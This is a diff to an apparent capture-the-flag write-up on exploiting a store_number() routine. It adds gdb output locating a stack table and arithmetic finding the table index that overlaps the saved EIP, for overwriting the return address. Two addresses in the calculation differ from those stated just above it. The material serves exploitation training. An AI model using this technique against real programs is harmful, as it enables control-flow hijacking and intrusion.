@@ -94,7 +94,18 @@ Ok, here are our addresses:
 Let's do step 2. 
 We need to find the index in the table where we reach EIP, and then store our payload there using ```store_number()```. 
 
-The table's address is 
+The table's address is ```0xffffd4f4```.
+```
+(gdb) b*store_number+6
+(gdb) r
+[...]
+Input command: store
+
+(gdb) p $ebp+0x8
+$1 = (void *) 0xffffd4d0  # int *data
+(gdb) x/a 0xffffd4d0
+0xffffd4d0:	0xffffd4f4  # data[0]
+```
 
 EIP's return address in the ```main()``` function is ```0xffffd6bc```.
 ```
@@ -106,6 +117,18 @@ Stack level 0, frame at 0xffffd6c0:
  Saved registers:
   eip at 0xffffd6bc
 ```
+
+Next, we need to calculate the 'index' of our EIP address. 
+```
+0xffffd63c   -   0xffffd474    =    int(0x1c8)  =  456
+eip_address     table_address                    [bytes]
+
+456 / 4  =  114
+          index in table
+
+114 % 3 = 0
+```
+
 
 We're going to write our payload at the address of EIP. 
 ```
